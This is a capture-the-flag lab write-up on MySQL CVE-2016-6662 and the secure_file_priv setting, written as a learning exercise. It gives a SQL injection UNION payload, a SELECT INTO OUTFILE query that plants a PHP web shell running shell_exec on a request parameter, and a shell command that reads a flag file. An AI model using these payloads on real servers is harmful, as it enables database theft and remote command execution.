## About this lab

This lab is dedicated for learning penetration testing skill through *CVE-2016-6662: MySQL Remote Root Code Execution*

### Core logic:
The problem with this CVE lies in the secure_file_priv variable, which was added in MySQL version 5.5.53.
It was supposed to add a layer of security since it restricted the privilege to read or write anywhere, which happened a lot back then.
However, in the early stages of version 5.6 up to version 5.7.6, the default value of secure_file_priv is null, so nothing is changed if the database admin doesn't take extra notice at that point.


### Writeup:
1. The first part of the flag is inside the database, you will get it with this payload: `1 UNION SELECT NULL, flag from flags`
2. The second part of the flag is located at the root folder of the server. You first create a PHP shell code with this:
```
select '<?php $output=shell_exec($_GET["cmd"]);
echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;
```
This create a PHP file with cmd parameter that take value from input and parse it to shell_exec() function - a PHP function that executing shell command.
3. With that parameter, you will get: `/shell.php?cmd=cat /flag.txt`.
4. You get the flag.

